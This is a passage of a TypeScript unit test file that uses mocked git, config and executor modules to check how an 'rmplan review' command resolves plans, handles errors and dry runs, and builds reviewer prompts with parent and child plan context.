import { expect, test, beforeEach, afterEach, describe, mock } from 'bun:test';
import { mkdtemp, writeFile, mkdir } from 'node:fs/promises';
import { join } from 'node:path';
import { tmpdir } from 'node:os';
import { ModuleMocker } from '../../testing.js';
import {
  handleReviewCommand,
  generateDiffForReview,
  buildReviewPrompt,
  sanitizeBranchName,
  validateInstructionsFilePath,
  validateFocusAreas,
} from './review.js';
import type { PlanSchema } from '../planSchema.js';
import type { PlanWithFilename } from '../utils/hierarchy.js';

const moduleMocker = new ModuleMocker(import.meta);

let testDir: string;

beforeEach(async () => {
  testDir = await mkdtemp(join(tmpdir(), 'rmplan-review-test-'));
});

afterEach(() => {
  moduleMocker.clear();
});

test('handleReviewCommand resolves plan by file path', async () => {
  // Create a test plan file
  const planContent = `
id: 1
title: Test Plan
goal: Test the review functionality
details: This is a test plan for the review command
tasks:
  - title: Test task
    description: A test task
    steps:
      - prompt: Do something
        done: false
`;

  const planFile = join(testDir, 'test-plan.yml');
  await writeFile(planFile, planContent);

  // Mock the buildExecutorAndLog and other dependencies
  await moduleMocker.mock('../executors/index.js', () => ({
    buildExecutorAndLog: () => ({
      execute: async () => 'Mock execution result',
    }),
    DEFAULT_EXECUTOR: 'copy-only',
  }));

  await moduleMocker.mock('../configLoader.js', () => ({
    loadEffectiveConfig: async () => ({
      defaultExecutor: 'copy-only',
    }),
  }));

  await moduleMocker.mock('../../common/git.js', () => ({
    getGitRoot: async () => testDir,
    getTrunkBranch: async () => 'main',
    getUsingJj: async () => false,
  }));

  // Mock the diff generation to return changes
  await moduleMocker.mock('./review.js', () => ({
    handleReviewCommand,
    generateDiffForReview: async () => ({
      hasChanges: true,
      changedFiles: ['test.ts'],
      baseBranch: 'main',
      diffContent: 'mock diff',
    }),
    buildReviewPrompt: (planData: any, diffResult: any, parentChain: any[] = [], completedChildren: any[] = [], customInstructions?: string) => 'mock review prompt',
  }));

  // Test resolving plan by file path
  const mockCommand = {
    parent: {
      opts: () => ({}),
    },
  };

  try {
    await handleReviewCommand(planFile, {}, mockCommand);
  } catch (err) {
    console.error('Test error:', err);
    throw err;
  }
});

test('handleReviewCommand resolves plan by ID', async () => {
  // Create a test plan file with ID
  const planContent = `
id: 42
title: Test Plan with ID
goal: Test plan resolution by ID
details: This plan should be resolvable by its ID
tasks:
  - title: Test task
    description: A test task
    steps:
      - prompt: Do something
        done: false
`;

  const planFile = join(testDir, 'test-plan-42.yml');
  await writeFile(planFile, planContent);

  // Mock dependencies
  await moduleMocker.mock('../executors/index.js', () => ({
    buildExecutorAndLog: () => ({
      execute: async () => 'Mock execution result',
    }),
    DEFAULT_EXECUTOR: 'copy-only',
  }));

  await moduleMocker.mock('../configLoader.js', () => ({
    loadEffectiveConfig: async () => ({
      defaultExecutor: 'copy-only',
    }),
  }));

  await moduleMocker.mock('../plans.js', () => ({
    resolvePlanFile: async (planFileOrId: string) => {
      if (planFileOrId === '42') {
        return planFile;
      }
      return planFileOrId;
    },
    readPlanFile: async () => ({
      id: 42,
      title: 'Test Plan with ID',
      goal: 'Test plan resolution by ID',
      details: 'This plan should be resolvable by its ID',
      tasks: [
        {
          title: 'Test task',
          description: 'A test task',
        },
      ],
    }),
  }));

  await moduleMocker.mock('../../common/git.js', () => ({
    getGitRoot: async () => testDir,
    getTrunkBranch: async () => 'main',
    getUsingJj: async () => false,
  }));

  await moduleMocker.mock('./review.js', () => ({
    handleReviewCommand,
    generateDiffForReview: async () => ({
      hasChanges: true,
      changedFiles: ['test.ts'],
      baseBranch: 'main',
      diffContent: 'mock diff',
    }),
    buildReviewPrompt: (planData: any, diffResult: any, parentChain: any[] = [], completedChildren: any[] = [], customInstructions?: string) => 'mock review prompt',
  }));

  // Test resolving plan by ID
  const mockCommand = {
    parent: {
      opts: () => ({}),
    },
  };

  try {
    await handleReviewCommand('42', {}, mockCommand);
    expect(true).toBe(true); // Test passed
  } catch (err) {
    console.error('Test error:', err);
    throw err;
  }
});

describe('generateDiffForReview', () => {
  test('function exists and can be called', async () => {
    // Since mocking the Bun $ utility is complex in tests, we'll test that the function
    // exists and has the expected interface, then test the full functionality in integration tests
    const gitRepoDir = await mkdtemp(join(tmpdir(), 'rmplan-git-test-'));

    // Mock git utilities to avoid actual git calls
    await moduleMocker.mock('../../common/git.js', () => ({
      getTrunkBranch: async () => 'main',
      getUsingJj: async () => false,
    }));

    // Test that the function exists and has the expected structure
    expect(typeof generateDiffForReview).toBe('function');

    // The function should handle the case when git commands fail gracefully
    try {
      await generateDiffForReview(gitRepoDir);
    } catch (error) {
      // Should throw a meaningful error if git commands fail
      expect(error.message).toContain('Failed to generate');
    }
  });

  test('function interface with jj', async () => {
    const jjRepoDir = await mkdtemp(join(tmpdir(), 'rmplan-jj-test-'));

    await moduleMocker.mock('../../common/git.js', () => ({
      getTrunkBranch: async () => 'main',
      getUsingJj: async () => true,
    }));

    // Test that the function exists and handles jj mode
    expect(typeof generateDiffForReview).toBe('function');

    try {
      await generateDiffForReview(jjRepoDir);
    } catch (error) {
      // Should throw a meaningful error if jj commands fail
      expect(error.message).toContain('Failed to generate');
    }
  });
});

describe('buildReviewPrompt', () => {
  test('includes plan context and diff content', async () => {
    const planData: PlanSchema = {
      id: 42,
      title: 'Test Feature Implementation',
      goal: 'Implement a new test feature for the application',
      details: 'This feature should handle user authentication and data validation',
      tasks: [
        {
          title: 'Add authentication',
          description: 'Implement user login/logout functionality',
          steps: [
            { prompt: 'Create login component', done: true },
            { prompt: 'Add validation logic', done: false },
          ],
        },
        {
          title: 'Add data validation',
          description: 'Validate user input',
          steps: [{ prompt: 'Create validators', done: false }],
        },
      ],
    };

    const diffResult = {
      hasChanges: true,
      changedFiles: ['src/auth.ts', 'src/validation.ts'],
      baseBranch: 'main',
      diffContent: `diff --git a/src/auth.ts b/src/auth.ts
index 1234567..abcdefg 100644
--- a/src/auth.ts
+++ b/src/auth.ts
@@ -1,3 +1,6 @@
 export class Auth {
+  login(user: string) {
+    return true;
+  }
 }`,
    };

    // Mock the reviewer prompt
    await moduleMocker.mock('../executors/claude_code/agent_prompts.js', () => ({
      getReviewerPrompt: (contextContent: string) => ({
        name: 'reviewer',
        description: 'Reviews code',
        prompt: `REVIEWER AGENT\n\n${contextContent}\n\nPLEASE REVIEW THE CODE`,
      }),
    }));

    const prompt = buildReviewPrompt(planData, diffResult, [], []);

    // Verify plan context is included
    expect(prompt).toContain('Plan ID:** 42');
    expect(prompt).toContain('Title:** Test Feature Implementation');
    expect(prompt).toContain('Goal:** Implement a new test feature');
    expect(prompt).toContain('Details:**');
    expect(prompt).toContain('This feature should handle user authentication');

    // Verify tasks are included
    expect(prompt).toContain('Tasks:**');
    expect(prompt).toContain('1. **Add authentication**');
    expect(prompt).toContain('Implement user login/logout functionality');
    expect(prompt).toContain('✓ 1. Create login component');
    expect(prompt).toContain('○ 2. Add validation logic');
    expect(prompt).toContain('2. **Add data validation**');

    // Verify diff content is included
    expect(prompt).toContain('Base Branch:** main');
    expect(prompt).toContain('Changed Files (2):**');
    expect(prompt).toContain('- src/auth.ts');
    expect(prompt).toContain('- src/validation.ts');
    expect(prompt).toContain('diff --git a/src/auth.ts');
    expect(prompt).toContain('+  login(user: string)');

    // Verify review instructions are included
    expect(prompt).toContain('Review Instructions');
    expect(prompt).toContain('Compliance with Plan Requirements');
    expect(prompt).toContain('Code Quality');
    expect(prompt).toContain('REVIEWER AGENT');
  });

  test('handles plan without tasks', async () => {
    const planData: PlanSchema = {
      id: 1,
      title: 'Simple Plan',
      goal: 'A simple goal',
      tasks: [],
    };

    const diffResult = {
      hasChanges: true,
      changedFiles: ['src/simple.ts'],
      baseBranch: 'main',
      diffContent: 'diff content here',
    };

    await moduleMocker.mock('../executors/claude_code/agent_prompts.js', () => ({
      getReviewerPrompt: (contextContent: string) => ({
        prompt: contextContent,
      }),
    }));

    const prompt = buildReviewPrompt(planData, diffResult, [], []);

    expect(prompt).toContain('Plan ID:** 1');
    expect(prompt).toContain('Title:** Simple Plan');
    expect(prompt).toContain('Goal:** A simple goal');
    expect(prompt).not.toContain('Details:**');
    expect(prompt).toContain('src/simple.ts');
  });

  test('handles plan without details', async () => {
    const planData: PlanSchema = {
      id: 2,
      title: 'Plan Without Details',
      goal: 'Test goal',
      tasks: [
        {
          title: 'Task 1',
          description: 'Description 1',
          steps: [],
        },
      ],
    };

    const diffResult = {
      hasChanges: true,
      changedFiles: ['test.ts'],
      baseBranch: 'master',
      diffContent: 'test diff',
    };

    await moduleMocker.mock('../executors/claude_code/agent_prompts.js', () => ({
      getReviewerPrompt: (contextContent: string) => ({
        prompt: contextContent,
      }),
    }));

    const prompt = buildReviewPrompt(planData, diffResult, [], []);

    expect(prompt).toContain('Plan ID:** 2');
    expect(prompt).toContain('Title:** Plan Without Details');
    expect(prompt).toContain('Goal:** Test goal');
    expect(prompt).not.toContain('Details:**');
    expect(prompt).toContain('1. **Task 1**');
    expect(prompt).toContain('Description 1');
    expect(prompt).toContain('Base Branch:** master');
  });
});

describe('handleReviewCommand error handling', () => {
  test('throws error when plan cannot be loaded', async () => {
    const invalidPlanFile = join(testDir, 'invalid.yml');

    await moduleMocker.mock('../plans.js', () => ({
      resolvePlanFile: async () => invalidPlanFile,
      readPlanFile: async () => null,
    }));

    await moduleMocker.mock('../configLoader.js', () => ({
      loadEffectiveConfig: async () => ({}),
    }));

    const mockCommand = {
      parent: {
        opts: () => ({}),
      },
    };

    await expect(handleReviewCommand(invalidPlanFile, {}, mockCommand)).rejects.toThrow(
      'Could not load plan from'
    );
  });

  test('exits early when no changes detected', async () => {
    const planContent = `
id: 1
title: Test Plan
goal: Test goal
tasks:
  - title: Test task
    description: A test task
`;
    const planFile = join(testDir, 'no-changes.yml');
    await writeFile(planFile, planContent);

    await moduleMocker.mock('../plans.js', () => ({
      resolvePlanFile: async () => planFile,
      readPlanFile: async () => ({
        id: 1,
        title: 'Test Plan',
        goal: 'Test goal',
        tasks: [
          {
            title: 'Test task',
            description: 'A test task',
          },
        ],
      }),
    }));

    await moduleMocker.mock('../configLoader.js', () => ({
      loadEffectiveConfig: async () => ({}),
    }));

    await moduleMocker.mock('../../common/git.js', () => ({
      getGitRoot: async () => testDir,
    }));

    // Mock generateDiffForReview to return no changes
    await moduleMocker.mock('./review.js', () => ({
      handleReviewCommand,
      generateDiffForReview: async () => ({
        hasChanges: false,
        changedFiles: [],
        baseBranch: 'main',
        diffContent: '',
      }),
      buildReviewPrompt: buildReviewPrompt,
    }));

    const mockCommand = {
      parent: {
        opts: () => ({}),
      },
    };

    // Should complete without error but not call executor
    await expect(handleReviewCommand(planFile, {}, mockCommand)).resolves.toBeUndefined();
  });

  test('handles executor execution failure', async () => {
    const planContent = `
id: 1
title: Test Plan
goal: Test goal
tasks:
  - title: Test task
    description: A test task
`;
    const planFile = join(testDir, 'executor-fail.yml');
    await writeFile(planFile, planContent);

    const mockExecutor = {
      execute: mock(async () => {
        throw new Error('Executor failed');
      }),
    };

    await moduleMocker.mock('../plans.js', () => ({
      resolvePlanFile: async () => planFile,
      readPlanFile: async () => ({
        id: 1,
        title: 'Test Plan',
        goal: 'Test goal',
        tasks: [
          {
            title: 'Test task',
            description: 'A test task',
          },
        ],
      }),
    }));

    await moduleMocker.mock('../configLoader.js', () => ({
      loadEffectiveConfig: async () => ({
        defaultExecutor: 'copy-only',
      }),
    }));

    await moduleMocker.mock('../executors/index.js', () => ({
      buildExecutorAndLog: () => mockExecutor,
      DEFAULT_EXECUTOR: 'copy-only',
    }));

    await moduleMocker.mock('../../common/git.js', () => ({
      getGitRoot: async () => testDir,
    }));

    await moduleMocker.mock('./review.js', () => ({
      handleReviewCommand,
      generateDiffForReview: async () => ({
        hasChanges: true,
        changedFiles: ['test.ts'],
        baseBranch: 'main',
        diffContent: 'some diff',
      }),
      buildReviewPrompt: (planData: any, diffResult: any, parentChain: any[] = [], completedChildren: any[] = [], customInstructions?: string) => 'review prompt',
    }));

    const mockCommand = {
      parent: {
        opts: () => ({}),
      },
    };

    await expect(handleReviewCommand(planFile, {}, mockCommand)).rejects.toThrow(
      'Review execution failed'
    );
  });
});

describe('integration with executor system', () => {
  test('passes correct parameters to executor', async () => {
    const planContent = `
id: 123
title: Integration Test Plan
goal: Test executor integration
tasks:
  - title: Test task
    description: Integration test task
`;
    const planFile = join(testDir, 'integration.yml');
    await writeFile(planFile, planContent);

    const mockExecutor = {
      execute: mock(async (prompt: string, metadata: any) => {
        expect(prompt).toContain('REVIEWER AGENT');
        expect(metadata.planId).toBe('123');
        expect(metadata.planTitle).toBe('Integration Test Plan');
        expect(metadata.planFilePath).toBe(planFile);
        return 'Mock review result';
      }),
    };

    await moduleMocker.mock('../plans.js', () => ({
      resolvePlanFile: async () => planFile,
      readPlanFile: async () => ({
        id: 123,
        title: 'Integration Test Plan',
        goal: 'Test executor integration',
        tasks: [
          {
            title: 'Test task',
            description: 'Integration test task',
          },
        ],
      }),
    }));

    await moduleMocker.mock('../configLoader.js', () => ({
      loadEffectiveConfig: async () => ({
        defaultExecutor: 'claude-code',
      }),
    }));

    await moduleMocker.mock('../executors/index.js', () => ({
      buildExecutorAndLog: (executorName: string, options: any, config: any) => {
        expect(executorName).toBe('claude-code');
        expect(options.baseDir).toBe(testDir);
        expect(options.interactive).toBe(false);
        return mockExecutor;
      },
      DEFAULT_EXECUTOR: 'copy-only',
    }));

    await moduleMocker.mock('../executors/claude_code/agent_prompts.js', () => ({
      getReviewerPrompt: (contextContent: string) => ({
        prompt: `REVIEWER AGENT\n\n${contextContent}`,
      }),
    }));

    await moduleMocker.mock('../../common/git.js', () => ({
      getGitRoot: async () => testDir,
    }));

    await moduleMocker.mock('./review.js', () => ({
      handleReviewCommand,
      generateDiffForReview: async () => ({
        hasChanges: true,
        changedFiles: ['src/test.ts'],
        baseBranch: 'main',
        diffContent: 'test diff content',
      }),
      buildReviewPrompt,
    }));

    const mockCommand = {
      parent: {
        opts: () => ({}),
      },
    };

    await handleReviewCommand(planFile, { executor: 'claude-code' }, mockCommand);

    expect(mockExecutor.execute).toHaveBeenCalledTimes(1);
  });

  test('respects dry-run option', async () => {
    const planContent = `
id: 1
title: Dry Run Test
goal: Test dry run functionality
tasks:
  - title: Test task
    description: Dry run test task
`;
    const planFile = join(testDir, 'dry-run.yml');
    await writeFile(planFile, planContent);

    const mockExecutor = {
      execute: mock(async () => 'Should not be called'),
    };

    await moduleMocker.mock('../plans.js', () => ({
      resolvePlanFile: async () => planFile,
      readPlanFile: async () => ({
        id: 1,
        title: 'Dry Run Test',
        goal: 'Test dry run functionality',
        tasks: [
          {
            title: 'Test task',
            description: 'Dry run test task',
          },
        ],
      }),
    }));

    await moduleMocker.mock('../configLoader.js', () => ({
      loadEffectiveConfig: async () => ({}),
    }));

    await moduleMocker.mock('../executors/index.js', () => ({
      buildExecutorAndLog: () => mockExecutor,
      DEFAULT_EXECUTOR: 'copy-only',
    }));

    await moduleMocker.mock('../../common/git.js', () => ({
      getGitRoot: async () => testDir,
    }));

    await moduleMocker.mock('./review.js', () => ({
      handleReviewCommand,
      generateDiffForReview: async () => ({
        hasChanges: true,
        changedFiles: ['test.ts'],
        baseBranch: 'main',
        diffContent: 'test diff',
      }),
      buildReviewPrompt: (planData: any, diffResult: any, parentChain: any[] = [], completedChildren: any[] = [], customInstructions?: string) => 'Generated prompt for dry run',
    }));

    const mockCommand = {
      parent: {
        opts: () => ({}),
      },
    };

    await handleReviewCommand(planFile, { dryRun: true }, mockCommand);

    // Executor should not be called in dry-run mode
    expect(mockExecutor.execute).not.toHaveBeenCalled();
  });
});

describe('Parent plan context handling', () => {
  test('includes parent context when plan has a parent', async () => {
    const parentPlan: PlanSchema = {
      id: 99,
      title: 'PR review command',
      goal: 'Implement a new rmplan review command that analyzes code changes against plan requirements',
      details:
        'The review command will compare the current branch to the trunk branch, gather all relevant plan context',
      tasks: [],
    };

    const childPlan: PlanSchema = {
      id: 101,
      title: 'PR review command - Parent-Child Plan Integration',
      goal: 'Enhance the review command to intelligently handle plan hierarchies',
      details:
        'Extend the review command to automatically include relevant context from parent plans',
      parent: 99,
      tasks: [
        {
          title: 'Implement parent plan context gathering',
          description:
            'Add logic to detect when a plan has a parent and automatically include parent context',
        },
      ],
    };

    const diffResult = {
      hasChanges: true,
      changedFiles: ['src/rmplan/commands/review.ts'],
      baseBranch: 'main',
      diffContent: 'mock diff content',
    };

    await moduleMocker.mock('../executors/claude_code/agent_prompts.js', () => ({
      getReviewerPrompt: (contextContent: string) => ({
        prompt: contextContent,
      }),
    }));

    const prompt = buildReviewPrompt(childPlan, diffResult, [parentPlan], []);

    // Verify parent context is included
    expect(prompt).toContain('# Parent Plan Context');
    expect(prompt).toContain('**Parent Plan ID:** 99');
    expect(prompt).toContain('**Parent Title:** PR review command');
    expect(prompt).toContain('**Parent Goal:** Implement a new rmplan review command');
    expect(prompt).toContain(
      'This review is for a child plan implementing part of the parent plan above.'
    );

    // Verify child plan context still included
    expect(prompt).toContain('# Plan Context');
    expect(prompt).toContain('**Plan ID:** 101');
    expect(prompt).toContain('**Title:** PR review command - Parent-Child Plan Integration');
  });

  test('works normally when plan has no parent', async () => {
    const planData: PlanSchema = {
      id: 42,
      title: 'Standalone Plan',
      goal: 'A plan without a parent',
      tasks: [
        {
          title: 'Task 1',
          description: 'A simple task',
        },
      ],
    };

    const diffResult = {
      hasChanges: true,
      changedFiles: ['test.ts'],
      baseBranch: 'main',
      diffContent: 'mock diff',
    };

    await moduleMocker.mock('../executors/claude_code/agent_prompts.js', () => ({
      getReviewerPrompt: (contextContent: string) => ({
        prompt: contextContent,
      }),
    }));

    const prompt = buildReviewPrompt(planData, diffResult, [], []);

    // Should not include parent context
    expect(prompt).not.toContain('# Parent Plan Context');
    expect(prompt).not.toContain('Parent Plan ID');

    // Should still include normal plan context
    expect(prompt).toContain('# Plan Context');
    expect(prompt).toContain('**Plan ID:** 42');
    expect(prompt).toContain('**Title:** Standalone Plan');
  });

  test('continues without parent context when parent plan is missing', async () => {
    // This test ensures the review works even if parent plan cannot be found
    const childPlan: PlanSchema = {
      id: 101,
      title: 'Child Plan',
      goal: 'A child plan with missing parent',
      parent: 99, // Parent ID exists but plan will not be found
      tasks: [
        {
          title: 'Test task',
          description: 'A test task',
        },
      ],
    };

    const diffResult = {
      hasChanges: true,
      changedFiles: ['test.ts'],
      baseBranch: 'main',
      diffContent: 'mock diff',
    };

    await moduleMocker.mock('../executors/claude_code/agent_prompts.js', () => ({
      getReviewerPrompt: (contextContent: string) => ({
        prompt: contextContent,
      }),
    }));

    // Test with undefined parent (simulating missing parent)
    const prompt = buildReviewPrompt(childPlan, diffResult, [], []);

    // Should not include parent context when parent is missing
    expect(prompt).not.toContain('# Parent Plan Context');
    expect(prompt).not.toContain('Parent Plan ID');

    // Should still include child plan context
    expect(prompt).toContain('# Plan Context');
    expect(prompt).toContain('**Plan ID:** 101');
    expect(prompt).toContain('**Title:** Child Plan');
  });

  test('handles parent plan context integration in handleReviewCommand', async () => {
    const testDir = await mkdtemp(join(tmpdir(), 'rmplan-parent-test-'));

    // Create parent plan file
    const parentPlanContent = `
id: 99
title: Parent Plan
goal: Parent goal for context
details: This is the parent plan providing context
tasks:
  - title: Parent task
    description: A parent task
`;
    const parentPlanFile = join(testDir, 'parent-99.yml');
    await writeFile(parentPlanFile, parentPlanContent);

    // Create child plan file
    const childPlanContent = `
id: 101
title: Child Plan
goal: Child goal that implements parent
parent: 99
tasks:
  - title: Child task
    description: A child task
`;
    const childPlanFile = join(testDir, 'child-101.yml');
    await writeFile(childPlanFile, childPlanContent);

    const mockExecutor = {
      execute: mock(async (prompt: string) => {
        // Verify the prompt includes parent context
        expect(prompt).toContain('# Parent Plan Context');
        expect(prompt).toContain('**Parent Plan ID:** 99');
        expect(prompt).toContain('**Parent Title:** Parent Plan');
        return 'Mock review result';
      }),
    };

    await moduleMocker.mock('../plans.js', () => ({
      resolvePlanFile: async (planFileOrId: string) => {
        if (planFileOrId === childPlanFile) return childPlanFile;
        if (planFileOrId === parentPlanFile) return parentPlanFile;
        if (planFileOrId === '99') return parentPlanFile; // Handle parent ID resolution
        return planFileOrId;
      },
      readPlanFile: async (filePath: string) => {
        if (filePath === parentPlanFile) {
          return {
            id: 99,
            title: 'Parent Plan',
            goal: 'Parent goal for context',
            details: 'This is the parent plan providing context',
            tasks: [
              {
                title: 'Parent task',
                description: 'A parent task',
              },
            ],
          };
        }
        if (filePath === childPlanFile) {
          return {
            id: 101,
            title: 'Child Plan',
            goal: 'Child goal that implements parent',
            parent: 99,
            tasks: [
              {
                title: 'Child task',
                description: 'A child task',
              },
            ],
          };
        }
        return null;
      },
    }));

    await moduleMocker.mock('../configLoader.js', () => ({
      loadEffectiveConfig: async () => ({
        defaultExecutor: 'copy-only',
      }),
    }));

    await moduleMocker.mock('../executors/index.js', () => ({
      buildExecutorAndLog: () => mockExecutor,
      DEFAULT_EXECUTOR: 'copy-only',
    }));

    await moduleMocker.mock('../../common/git.js', () => ({
      getGitRoot: async () => testDir,
    }));

    await moduleMocker.mock('./review.js', () => ({
      handleReviewCommand,
      generateDiffForReview: async () => ({
        hasChanges: true,
        changedFiles: ['test.ts'],
        baseBranch: 'main',
        diffContent: 'test diff',
      }),
      buildReviewPrompt: (
        planData: any,
        diffResult: any,
        parentChain: any[] = [],
        completedChildren: any[] = []
      ) => {
        // Create a test prompt that includes parent context when parent is provided
        let prompt = `REVIEWER AGENT\n\n`;

        if (parentChain && parentChain.length > 0) {
          const parentPlan = parentChain[0];
          prompt += `# Parent Plan Context\n\n`;
          prompt += `**Parent Plan ID:** ${parentPlan.id}\n`;
          prompt += `**Parent Title:** ${parentPlan.title}\n`;
          prompt += `**Parent Goal:** ${parentPlan.goal}\n\n`;
        }

        prompt += `# Plan Context\n\n`;
        prompt += `**Plan ID:** ${planData.id}\n`;
        prompt += `**Title:** ${planData.title}\n`;
        prompt += `**Goal:** ${planData.goal}\n\n`;

        return prompt;
      },
    }));

    const mockCommand = {
      parent: {
        opts: () => ({
          config: testDir,
        }),
      },
    };

    await handleReviewCommand(childPlanFile, {}, mockCommand);

    expect(mockExecutor.execute).toHaveBeenCalledTimes(1);
  });
});

describe('Hierarchy integration with utilities', () => {
  test('handles multiple levels of parent plans', async () => {
    const grandparentPlan: PlanWithFilename = {
      id: 50,
      title: 'Root Project Plan',
      goal: 'Implement the entire project',
      details: 'This is the top-level project plan',
      tasks: [],
      filename: 'grandparent-50.yml',
    };

    const parentPlan: PlanWithFilename = {
      id: 99,
      title: 'PR review command',
      goal: 'Implement review functionality',
      details: 'Mid-level plan for review features',
      parent: 50,
      tasks: [],
      filename: 'parent-99.yml',
    };

    const childPlan: PlanSchema = {
      id: 101,
      title: 'PR review command - Parent-Child Integration',
      goal: 'Enhance review command with hierarchy support',
      parent: 99,
      tasks: [
        {
          title: 'Test task',
          description: 'A test task',
        },
      ],
    };

    const diffResult = {
      hasChanges: true,
      changedFiles: ['src/review.ts'],
      baseBranch: 'main',
      diffContent: 'test diff',
    };

    await moduleMocker.mock('../executors/claude_code/agent_prompts.js', () => ({
      getReviewerPrompt: (contextContent: string) => ({
        prompt: contextContent,
      }),
    }));

    // Test with multi-level parent chain
    const parentChain = [parentPlan, grandparentPlan];
    const prompt = buildReviewPrompt(childPlan, diffResult, parentChain, []);

    // Verify both parent levels are included
    expect(prompt).toContain('# Parent Plan Context');
    expect(prompt).toContain('**Parent Plan ID:** 99');
    expect(prompt).toContain('**Parent Title:** PR review command');
    expect(prompt).toContain('**Grandparent (Level 2) Plan ID:** 50');
    expect(prompt).toContain('**Grandparent (Level 2) Title:** Root Project Plan');
    expect(prompt).toContain('---'); // Section separator
    expect(prompt).toContain(
      'This review is for a child plan implementing part of the parent plans above'
    );
  });

  test('includes completed children when reviewing parent plan', async () => {
    const parentPlan: PlanSchema = {
      id: 99,
      title: 'PR review command',
      goal: 'Implement complete review functionality',
      tasks: [
        {
          title: 'Parent task',
          description: 'High-level task',
        },
      ],
    };

    const completedChild1: PlanWithFilename = {
      id: 100,
      title: 'Core Review Implementation',
      goal: 'Implement basic review command',
      details: 'This child handles the core review logic',
      status: 'done',
      parent: 99,
      tasks: [],
      filename: 'child-100.yml',
    };

    const completedChild2: PlanWithFilename = {
      id: 101,
      title: 'Parent-Child Integration',
      goal: 'Add hierarchy support to review',
      details: 'This child adds parent-child relationship handling',
      status: 'done',
      parent: 99,
      tasks: [],
      filename: 'child-101.yml',
    };

    const diffResult = {
      hasChanges: true,
      changedFiles: ['src/review.ts', 'src/hierarchy.ts'],
      baseBranch: 'main',
      diffContent: 'parent review diff',
    };

    await moduleMocker.mock('../executors/claude_code/agent_prompts.js', () => ({
      getReviewerPrompt: (contextContent: string) => ({
        prompt: contextContent,
      }),
    }));

    const completedChildren = [completedChild1, completedChild2];
    const prompt = buildReviewPrompt(parentPlan, diffResult, [], completedChildren);

    // Verify completed children section is included
    expect(prompt).toContain('# Completed Child Plans');
    expect(prompt).toContain(
      'The following child plans have been completed as part of this parent plan:'
    );
    expect(prompt).toContain('**Child Plan ID:** 100');
    expect(prompt).toContain('**Child Title:** Core Review Implementation');
    expect(prompt).toContain('**Child Goal:** Implement basic review command');
    expect(prompt).toContain('**Child Plan ID:** 101');
    expect(prompt).toContain('**Child Title:** Parent-Child Integration');
    expect(prompt).toContain(
      'consider how these completed children contribute to the overall goals'
    );
  });

  test('handles both parent chain and completed children together', async () => {
    const grandparentPlan: PlanWithFilename = {
      id: 50,
      title: 'Project Root',
      goal: 'Top level goal',
      tasks: [],
      filename: 'grandparent-50.yml',
    };

    const parentPlan: PlanWithFilename = {
      id: 99,
      title: 'Middle Plan',
      goal: 'Middle level goal',
      parent: 50,
      tasks: [],
      filename: 'parent-99.yml',
    };

    const currentPlan: PlanSchema = {
      id: 101,
      title: 'Current Plan',
      goal: 'Current plan goal',
      parent: 99,
      tasks: [
        {
          title: 'Current task',
          description: 'Task description',
        },
      ],
    };

    const completedChild: PlanWithFilename = {
      id: 102,
      title: 'Completed Child',
      goal: 'Child goal',
      status: 'done',
      parent: 101,
      tasks: [],
      filename: 'child-102.yml',
    };

    const diffResult = {
      hasChanges: true,
      changedFiles: ['test.ts'],
      baseBranch: 'main',
      diffContent: 'complex diff',
    };

    await moduleMocker.mock('../executors/claude_code/agent_prompts.js', () => ({
      getReviewerPrompt: (contextContent: string) => ({
        prompt: contextContent,
      }),
    }));

    const parentChain = [parentPlan, grandparentPlan];
    const completedChildren = [completedChild];
    const prompt = buildReviewPrompt(currentPlan, diffResult, parentChain, completedChildren);

    // Verify both parent and children contexts are included in correct order
    expect(prompt).toContain('# Parent Plan Context');
    expect(prompt).toContain('**Parent Plan ID:** 99');
    expect(prompt).toContain('**Grandparent (Level 2) Plan ID:** 50');

    expect(prompt).toContain('# Completed Child Plans');
    expect(prompt).toContain('**Child Plan ID:** 102');

    expect(prompt).toContain('# Plan Context');
    expect(prompt).toContain('**Plan ID:** 101');

    // Verify order: parent context, then children context, then current plan context
    const parentIndex = prompt.indexOf('# Parent Plan Context');
    const childrenIndex = prompt.indexOf('# Completed Child Plans');
    const planIndex = prompt.indexOf('# Plan Context');

    expect(parentIndex).toBeLessThan(childrenIndex);
    expect(childrenIndex).toBeLessThan(planIndex);
  });

  test('handles plan without ID gracefully', async () => {
    const planWithoutId: PlanSchema = {
      // No ID field
      title: 'Plan Without ID',
      goal: 'Test plan without ID',
      tasks: [
        {
          title: 'Test task',
          description: 'Task description',
        },
      ],
    };

    const diffResult = {
      hasChanges: true,
      changedFiles: ['test.ts'],
      baseBranch: 'main',
      diffContent: 'simple diff',
    };

    await moduleMocker.mock('../executors/claude_code/agent_prompts.js', () => ({
      getReviewerPrompt: (contextContent: string) => ({
        prompt: contextContent,
      }),
    }));

    // Should not attempt hierarchy traversal without an ID
    const prompt = buildReviewPrompt(planWithoutId, diffResult, [], []);

    expect(prompt).not.toContain('# Parent Plan Context');
    expect(prompt).not.toContain('# Completed Child Plans');
    expect(prompt).toContain('# Plan Context');
    expect(prompt).toContain('**Title:** Plan Without ID');
  });

  test('handles empty parent chain and children arrays', async () => {
    const simplePlan: PlanSchema = {
      id: 1,
      title: 'Simple Plan',
      goal: 'Simple goal',
      tasks: [
        {
          title: 'Simple task',
          description: 'Simple description',
        },
      ],
    };

    const diffResult = {
      hasChanges: true,
      changedFiles: ['simple.ts'],
      baseBranch: 'main',
      diffContent: 'simple diff',
    };

    await moduleMocker.mock('../executors/claude_code/agent_prompts.js', () => ({
      getReviewerPrompt: (contextContent: string) => ({
        prompt: contextContent,
      }),
    }));

    const prompt = buildReviewPrompt(simplePlan, diffResult, [], []);

    // Should work like before - no parent or children sections
    expect(prompt).not.toContain('# Parent Plan Context');
    expect(prompt).not.toContain('# Completed Child Plans');
    expect(prompt).toContain('# Plan Context');
    expect(prompt).toContain('**Plan ID:** 1');
    expect(prompt).toContain('**Title:** Simple Plan');
  });

  test('handles plan hierarchy with missing plan details gracefully', async () => {
    const parentWithoutDetails: PlanWithFilename = {
      id: 99,
      title: 'Parent Plan',
      goal: 'Parent goal',
      // No details field
      tasks: [],
      filename: 'parent-99.yml',
    };

    const childWithoutDetails: PlanWithFilename = {
      id: 101,
      title: 'Child Plan',
      goal: 'Child goal',
      // No details field
      status: 'done',
      parent: 99,
      tasks: [],
      filename: 'child-101.yml',
    };

    const currentPlan: PlanSchema = {
      id: 100,
      title: 'Current Plan',
      goal: 'Current goal',
      parent: 99,
      tasks: [
        {
          title: 'Task',
          description: 'Description',
        },
      ],
    };

    const diffResult = {
      hasChanges: true,
      changedFiles: ['test.ts'],
      baseBranch: 'main',
      diffContent: 'test diff',
    };

    await moduleMocker.mock('../executors/claude_code/agent_prompts.js', () => ({
